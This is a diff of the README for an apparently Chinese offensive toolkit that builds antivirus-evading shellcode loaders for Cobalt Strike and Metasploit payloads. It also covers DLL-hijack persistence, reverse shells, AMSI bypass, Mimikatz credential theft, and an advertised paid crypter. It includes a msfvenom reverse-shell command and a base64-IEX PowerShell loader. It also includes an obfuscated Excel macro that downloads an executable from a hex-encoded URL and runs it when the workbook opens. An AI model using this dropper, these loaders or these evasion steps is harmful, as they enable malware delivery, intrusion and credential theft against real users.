@@ -1,156 +1,350 @@
-## 说明：
+# GlllPowerloader
 
 
-[TOC]
-## 0x01.更新
 
-该工具集成了C/C++ 、C# 、nim 、PowerShell的免杀加载器
+- [GlllPowerloader](#glllpowerloader)
+- [1.前言](#1前言)
+- [2.功能](#2功能)
+- [3.使用](#3使用)
+  - [0x01.环境安装](#0x01环境安装)
+  - [0x02.shellcode loader的使用](#0x02shellcode-loader的使用)
+  - [0x03.Automation\_loader](#0x03automation_loader)
+  - [0x04.文件格式转换](#0x04文件格式转换)
+  - [0x05.自动化生成代理DLL](#0x05自动化生成代理dll)
+  - [0x06.文件捆绑和上传](#0x06文件捆绑和上传)
+  - [0x07.Netcat监听\&\&反弹shell](#0x07netcat监听反弹shell)
+  - [0x08.内网凭据收集](#0x08内网凭据收集)
+  - [0x09.shellcode加密解密](#0x09shellcode加密解密)
+  - [0x10.Nim自动化嵌入宏代码](#0x10nim自动化嵌入宏代码)
+  - [0x11.脚本命令混淆](#0x11脚本命令混淆)
+    - [1.cmd命令混淆](#1cmd命令混淆)
+    - [2.Powershell命令混淆](#2powershell命令混淆)
+    - [3.powershell图片隐写术](#3powershell图片隐写术)
+- [4.更新](#4更新)
+- [5.免责声明](#5免责声明)
+- [6.结语](#6结语)
 
-[+]2022-4-27：
+# 1.前言
 
-加载模块:nim、powershell，可免杀卡巴斯基，windows defender ，360，火绒
+* 许多内网场景或处于红队评估的渗透测试工作中经常会遇到各种AV/EDR，此前我已经在工作中编写了大量的Shellcode loader用于绕过防病毒，由于每次使用时需要编译二进制文件，频繁地打开臃肿的IDE已经让我疲惫不堪，因此我想编写一个自动化工具来快速并且批量地编译二进制文件，旨在提升工作效率。为方便框架中C#、powershell代码的自动化，目前Powerloader只支持windwos平台，您需要根据所在windows系统版本选择不同的.NET Framework版本
 
-[+]2022-5-18:
+* 不要上传Virus total相关的在线沙箱平台，请下载相关的AV/EDR去测试它们的可靠性
 
-1.添加C/C++加载模块，可免杀windows defender 、360、火绒
-
-2.添加了套接字模块，Nim socket实现跨平台，并且免杀主流杀软
-
-[+]2022-6-3改动:
-
-1.添加了文件格式转换模块，并且ps1转vbs、ps1转exe皆可绕过windows defender
-
-2.删除了nim加载模块，添加了Csharp加载模块（降低了免杀的效果）
-
-3.解决了csharp的版本兼容性（可以同时在win7、服务器win2008以上的windows版本同时运行）
-
-[+]2022-6-10:
-
-1.添加链接:C++加载器参考:https://github.com/icyguider/Shhhloader
-
-2.停止该开源项目的发布和维护
-
-
-## 0x02.环境配置
-
-运行环境：windows10
-
-1.C/C++编译环境: 安装mingw，GCC/G++编译器，并且配置环境变量
-
-输入G++,GCC 出现以下情况说明环境安装成功
-
-![image](https://user-images.githubusercontent.com/89376703/172179649-32d3ba7d-c48b-4098-b58f-6154d2c312bf.png)
-
-2.C#编译环境: Windows自带C#编译器（csc.exe）
-
-3.Nim编译环境: 如果要使用Nim Lang的套接字还是需要安装Nim环境和Winim的第三方库，最后配置环境变量
-
-输入nim -version查看是否安装成功
-
-![image](https://user-images.githubusercontent.com/89376703/172186202-d8d2127c-d834-4bc3-8644-e8a87df14064.png)
+* 不要语言攻击我，这只是一个公益学习项目
 
 
-## 0x03.工具介绍
 
-启动程序
+
+
+# 2.功能
+
+
+
+|       功能        |                         描述                          |
+| :---------------: | :---------------------------------------------------: |
+|   1.免杀加载器    |            拥有十种以上的shellcode加载方式            |
+|  2.文件格式转换   |              Windows中文件格式之间的转换              |
+|    3.权限维持     |         生成代理劫持的Dll，用于持久化渗透测试         |
+|    4.文件捆绑     |             1.捆绑文件异步执行2.上传文件              |
+|    5.反弹Shell    |         获取一个交互式的反向Shell并绕过AV/EDR         |
+|  6.获取密码凭证   |            通过powershell脚本收集内网信息             |
+|  7.shellcode加密  |                 16进制的shellcode加密                 |
+|  8.钓鱼文件生成   |               Nim Lang自动化嵌入宏代码                |
+|  9.脚本命令混淆   | 1.cmd命令混淆2.Powershell命令混淆3.powershell脚本隐写 |
+| 10.Netcat建立监听 |                  自定义端口单点监听                   |
+
+
+
+![image-20221220170604073](Image/image-20221220170604073.png)
+
+# 3.使用
+
+## 0x01.环境安装
+
+您必须下载并安装以下环境：
+
+1.Mingw64(C/C++)的编程环境：https://github.com/niXman/mingw-builds-binaries/releases/download/12.2.0-rt_v10-rev2/x86_64-12.2.0-release-posix-seh-msvcrt-rt_v10-rev2.7z
+
+将bin目录添加至环境变 量即可
+
+2.Golang编程环境：https://go.dev/dl/go1.19.4.windows-amd64.msi
+
+3.Nim编程环境：
+
+Nim下载：https://nim-lang.org/install.html
+
+将bin目录添加至环境变量
+
+您还需要下载Winim：https://github.com/khchen/winim
 
 ```
-python.exe .\Gllloader.py
+cd winim-master
+nimble install
 ```
 
-![image](https://user-images.githubusercontent.com/89376703/172190784-8a87774b-ce88-484d-93d5-936e922b16dc.png)
+![image-20221219180550495](Image/image-20221219180550495.png)
 
 
-### 该工具shellcode加载模块目前有7种加载方式，C/C++五种。
 
-### PowerShell和C#各一种，并且采用分离的方式进行加载。
+Powerloader运行还需要python3的编程环境，您需要去官网下载它们的安装包，并且在windows中添加它们的环境变量
 
-![image](https://user-images.githubusercontent.com/89376703/172180872-f2c7204b-e5ed-47c7-a0f3-9ff5e3ed6e8d.png)
+验证是否安装成功：
 
-1.C/C++加载器特点:随机化系统调用函数名称和XOR动态密钥使得每次生成的二进制文件硬编码数据不同，让杀软难以捕获特征。
-
-2.Powershell和C#shellcode加载特点:AMSI内存初始化失败，绕过AMSI的runtime和scantime后记载二进制文件以防止杀软对恶意进程的系统监控
-
-3.文件转换格式的使用方式也是大同小异，都是将powershellbase64加密解密然后分离，最后输入网址即可自动化生成VBS和exe文件
-
-4.套接字模块，输入IP和端口即可自动化生成文件，这里生成Nim的套接字是跨平台的可以在任意的windows、Linux、unix上运行
-
-## 0x04.效果图：
-
-### C/C++
-注意这里请使用stageless的shellcode(beacon.bin)
-![image-20220603115546523](https://user-images.githubusercontent.com/89376703/171785352-ef3ef6eb-3d7f-4e4a-89e5-85c34b757730.png)
-
-![image-20220603115649027](https://user-images.githubusercontent.com/89376703/171785644-f5698bbe-7338-4286-adff-15d81f145a09.png)
+![image-20221219130448625](Image/image-20221219130448625.png)
 
 
-![image-20220603115953626](https://user-images.githubusercontent.com/89376703/171785670-32590cff-2366-4ed2-97d6-00c75848ca36.png)
 
+如果您在windows中安装了Git，就可以这样使用：
 
-### Csharp
-
-用CobaltStrike/MSF生成一个StagerLess的PowerShell脚本，用Base64加密解密一下脚本，或者用Obfuscation去混淆一下，将powershell脚本作分离处理
-
-Bypass.txt
-``` 
-$qwertyuioop=@'
-base64ENCRYPTCONTEXT
-'@
-
-$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qwertyuioop))
-
-IEX $Decryption 
+```
+git clone https://github.com/INotGreen/Gllloader.git
+cd GlllPowerLoader-master
+pip install -r requirements.txt
+start.bat
 ```
 
-![image-20220603120218705](https://user-images.githubusercontent.com/89376703/171785685-08b2e011-18c0-449b-b7c1-d2823e002aa5.png)
-
-将分离过的网址填入即可。（这边需要填一下.NET的版本，问题不大）
-![image-20220603120218705](https://user-images.githubusercontent.com/89376703/171785748-ee462a2b-c733-4708-82bd-1dab18905e51.png)
 
 
+## 0x02.shellcode loader的使用
 
-### Powershell的加载器也是一样的操作
+![image-20221219131746558](Image/image-20221219131746558.png)
 
-
-
-## 0x05.注释
-
-新版本的加载器降低了免杀的效果，但是过国内、微软还是轻轻松松的
-
-[!]注意：不要将样本上传至VT、weibu等公网沙箱，他们会分享样本给厂商。本项目仅用作免杀思路的学习，为了保持免杀效果，请不要将它滥用。谢谢！
-
-
-## 此项目仅用于教育目的，禁止将该技术用于非法途径
-
-
-## 0x06.付费版免杀框架
-
-拥有更多免杀模块，更多的功能，免杀更多的杀软，支持多语言远控FUD加密
-![image-20220603121239074](https://user-images.githubusercontent.com/89376703/171785705-b2f17c5e-aec8-4d16-99a2-b6a46c51cd49.png)
-
-![image-20220603121257597](https://user-images.githubusercontent.com/89376703/171785718-a10306e0-2793-4b75-950e-faef1743a4bb.png)
+该模块一共携带13种shellcode加载方式，由于AV/EDR是实时更新的，开源工具显然不能有效地绕过高级AV/EDR，或许某些加载模块仍然可以绕过Microsoft Defender，但是大部分ShellcodeLoader已经被高级AV/EDR抓住(例如Kaspersky、Norton、Bitdefender、ESET Nod32......),这也是我选择将它们开源的原因
 
 
 
-## 0x07.学习独家免杀技巧
-视频教程:https://www.bilibili.com/video/BV1HS4y1a7gu/
+以CobaltStrike/Metasploit的攻击载荷为例，您需要生成stager/stageless的bin文件
 
-我的个人学习频道:Blibli搜索 我不是格林
+CobaltStrike：
 
-qq:1691587386 ，标明你的来意。
+![image-20221219134120888](Image/image-20221219134120888.png)
 
+Metasploit:
 
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f raw -o payload.bin
+```
 
-# 参考
-Jthuraisamy 的SysWhispers：https ://github.com/jthuraisamy/SysWhispers
+![image-20221219141214075](Image/image-20221219141214075.png)
 
-OutFlank 用于创建 InlineWhispers（Mingw-w64 兼容 SysWhispers）：https ://github.com/outflanknl/InlineWhispers
+依次选择注入模式、payload、要注入的进程即可在桌面生成二进制文件。
 
-FalconForceTeam 支持 SysWhispers2 的系统调用生成工具：https ://github.com/FalconForceTeam/SysWhispers2BOF
-
-Snovvcrash 用于他们的 NimHollow 项目，我将其用作流程空心化的模板：https ://github.com/snovvcrash/NimHollow
-
-Snovvcrash 我将其用作许多包含的注入技术的模板：https ://github.com/snovvcrash/DInjector
+其它语言的loader也是大同小异，只要有编程环境就可以编译成功。
 
 
 
+## 0x03.Automation_loader
+
+* 注意C#和Nim的Automation_loader，这个模块是用来编译powershell脚本的，因此您需要将powershell脚本上传到网页上，例如：https://pastebin.mozilla.org/.
+* powershell和C#相对于其它语言的免杀有更好的效果，但是.NET版本限制也是一大软肋，好在我已经解决了版本限制问题，这样显得它不会更糟糕.
+
+![image-20221219150031777](Image/image-20221219150031777.png)
+
+
+
+
+
+## 0x04.文件格式转换
+
+![image-20221220011711997](Image/image-20221220011711997.png)
+
+
+
+在ps1_to_vbs我添加了bypass AMSI的效果，因此您只需要将powershell上传到网页上即可
+
+## 0x05.自动化生成代理DLL
+
+
+
+![image-20221220014013165](Image/image-20221220014013165.png)
+
+
+
+这里使用了C/C++的loader，只是添加了DllMain(),如果您熟悉Dll hijacking技术就可以愉快地使用它了，但是现在
+
+
+
+## 0x06.文件捆绑和上传
+
+
+
+
+
+## 0x07.Netcat监听&&反弹shell
+
+为了避免在kali Linux上使用nc，我将它的二进制文件搬到了windows上（方便测试），您可以选择模块5 && 10进行测试，
+
+
+
+![image-20221220120708350](Image/image-20221220120708350.png)
+
+Nim Socket这是我很早之前的项目：https://github.com/INotGreen/Nim-Lang-Bypass
+
+直到现在我仍然相信它可以Bypass kaspersky
+
+<video id="video" controls=""src="https://user-images.githubusercontent.com/89376703/208883213-f0bfab92-efa3-491f-961d-717eb4322104.mp4" preload="none">
+
+
+
+
+
+
+
+## 0x08.内网凭据收集
+
+![image-20221220135231101](Image/image-20221220135231101.png)
+
+原谅我的懒惰，这只是一个剪切板，用来记录不同powershell执行的命令，这里我只是给了几个例子，您可以在Stub\Get_Credentials.ps1中添加您经常使用的powershell命令，您们也可以在这里下载源代码：https://github.com/INotGreen/Invoke-SharpOffensive
+
+
+
+功能：
+
+[+] 1.获取明文登入密码
+
+[+] 2.Patch-AMSI && Pacth-ETW && Unhook win32 API
+
+[+] 3.Mimikatz获取登入明文密码
+
+[+] 4.在不接触 LSASS 的情况下检索 NTLM 哈希
+
+
+
+## 0x09.shellcode加密解密
+
+<video id="video" controls=""src="https://user-images.githubusercontent.com/89376703/208888479-17ac64fc-ae84-43be-9b5b-27f182dce58c.mp4" preload="none">
+
+
+
+
+## 0x10.Nim自动化嵌入宏代码
+
+实际上Python、C#都可以向office中嵌入宏代码，之所以选择Nim去完成这项工作是因为我想尝试并熟悉这个强大的编程语言，您可以在Stub\Macro_stub.nim中查看它的工作原理
+
+这是一段经过了混淆的VBA代码示例
+
+```vb
+Const nttlhoxkct = 2
+Const iiteeob = 1
+Const wibykrztfufyal = 0
+#If VBA7 Then
+Private Declare PtrSafe Function jdyrkvwyjssyrfrtgo Lib "urlmon" Alias "URLDownloadToFileA" (ByVal nfzikibxsdvo As Long, _
+ByVal nfyeruzflbcyhef As String, ByVal amceoykkquja As String, ByVal estmiwpcwa As Long, _
+ByVal phlqgkhyboalui As Long) As Long
+#Else
+Private Declare Function jdyrkvwyjssyrfrtgo Lib "urlmon" Alias "URLDownloadToFileA" (ByVal nfzikibxsdvo As Long, _
+ByVal nfyeruzflbcyhef As String, ByVal amceoykkquja As String, ByVal estmiwpcwa As Long, _
+ByVal phlqgkhyboalui As Long) As Long
+#End If
+
+Sub Workbook_Open()
+spath = CreateObject(ealdczqdfdpyamq("5753637269") & ealdczqdfdpyamq("70742e5368656c6c")).SpecialFolders(ealdczqdfdpyamq("4170706461") & ealdczqdfdpyamq("7461"))
+x = jdyrkvwyjssyrfrtgo(wibykrztfufyal, ealdczqdfdpyamq("68747470733a2f2f7472612e736665722e72682f6765742f3042534971452f436269656e74342e302e657865"), spath & ealdczqdfdpyamq("5c74657374") & ealdczqdfdpyamq("2e657865"), wibykrztfufyal, wibykrztfufyal)
+Set ryrsjwtpvcgqbhrko = CreateObject(ealdczqdfdpyamq("57536372697074") & ealdczqdfdpyamq("2e5368656c6c"))
+ryrsjwtpvcgqbhrko.Exec (spath & ealdczqdfdpyamq("5c74") & ealdczqdfdpyamq("6573742e657865"))
+End Sub
+Function ealdczqdfdpyamq(ByVal idxsvoije As String) As String
+Dim tvcdiaakpb As Long
+For tvcdiaakpb = 1 To Len(idxsvoije) Step 2
+ealdczqdfdpyamq = ealdczqdfdpyamq & Chr$(Val("&H" & Mid$(idxsvoije, tvcdiaakpb, 2)))
+Next tvcdiaakpb
+End Function
+```
+
+* 绕过防病毒的必要条件：
+
+这仅是一段远程下载文件的VBA代码，本质上并没有什么恶意，但是黑客们可以利用它们在office中下载恶意软件，这极大增加了安全隐患，因此，防病毒软件对此很敏感。您在选择文件时必须选择一个经过FUD(免杀)处理的二进制文件，否则在上传时会被检测为病毒，在文件落地时也会被defender检测为恶意软件。我并不能保证它可以完全绕过Microsoft Defender以外的防病毒，这只是一个用来学习测试的项目。
+
+<video id="video" controls=""src="https://user-images.githubusercontent.com/89376703/208883483-577d3038-9329-49a2-ae60-94a733545896.mp4" preload="none">
+
+
+
+## 0x11.脚本命令混淆
+
+
+
+首先您需要在管理员的Powershell中执行
+
+```
+Set-ExecutionPolicy Unrestricted
+```
+
+![image-20221220123237577](Image/image-20221220123237577.png)
+
+
+
+
+
+### 1.cmd命令混淆
+
+```
+set command calc
+encoding
+2
+```
+
+![image-20221221144249300](Image/image-20221221144249300.png)
+
+
+
+一切都来源于：https://github.com/danielbohannon/Invoke-DOSfuscation
+
+
+
+### 2.Powershell命令混淆
+
+
+
+在渗透测试中遇到Microsoft Defender的场景，使用敏感的Powershell通常会被AMSI拦截，用Invoke-Obfuscation去混淆powershell代码，直至2022年，这都非常有效。
+
+powershell命令混淆
+
+```powershell
+set scriptblock calc
+token
+all
+1
+out ..\payload1.ps1
+```
+
+powershell脚本混淆
+
+```powershell
+set scriptpath C:\Users\admin\Desktop\payload.ps1
+token
+all
+1
+out ..\payload1.ps1
+```
+
+一切都来源于：https://github.com/danielbohannon/Invoke-Obfuscation
+
+### 3.powershell图片隐写术
+
+
+
+
+
+
+
+
+
+# 4.更新
+
+[+] 2022年12.20，Powerloader发布
+
+
+
+
+
+
+
+# 5.免责声明
+
+该工具仅用于网络安全教育和研究，禁止用于非法途径，我对您由使用或传播等由此软件引起的任何行为和/或损害不承担任何责任。您对使用此软件的任何行为承担全部责任，并承认此软件仅用于教育和研究目的。下载本软件或软件的源代码，您自动同意上述内容。
+
+# 6.结语
+
+在编写Powerloader时学习了很多前辈的项目，在此我非常感谢它们@
+
+关于C/C++的加载器非常感谢：https://github.com/icyguider/Shhhloader，我参考了它的部分代码和框架格式，这非常有意义
